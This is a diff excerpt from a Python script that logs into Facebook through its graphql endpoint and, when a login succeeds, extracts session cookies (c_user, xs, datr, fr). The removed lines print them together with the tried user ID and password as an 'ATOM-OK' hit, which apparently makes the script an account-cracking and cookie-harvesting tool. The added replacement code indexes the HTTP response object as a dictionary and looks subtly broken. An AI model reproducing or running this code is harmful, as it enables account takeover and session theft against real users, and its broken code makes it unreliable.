@@ -58,13 +58,7 @@ response = Session.post('https://graph.facebook.com/graphql', data=encode)
 #print(response.status_code)
 #print(f"Status Code: {response.status_code}")
 #print(f"Response URL: {response.url}")# Check login success
-if "session_key" in response.text and "uid" in response.text and "access_token" in response.text:
-    cokie = {
-                    "datr": re.search('"name":"datr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
-					"sb": base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-"),
-					"fr": re.search('"name":"fr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
-					"c_user": re.search('"name":"c_user","value":"(\d+)"', response.text.replace('\\', '')).group(1),
-					"xs": re.search('"name":"xs","value":"(.*?)"', response.text.replace('\\', '')).group(1),
-                }
-    cookie = ';'.join(f'{key}={value}' for key, value in cokie.items())
-    print(f" {green}(ATOM-OK) {uid}|{pw}|{cookie} ")
+if "session_key" in response.text and "uid" in response.text and "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
+    sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+    ckkk = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
+    print(ckkk)
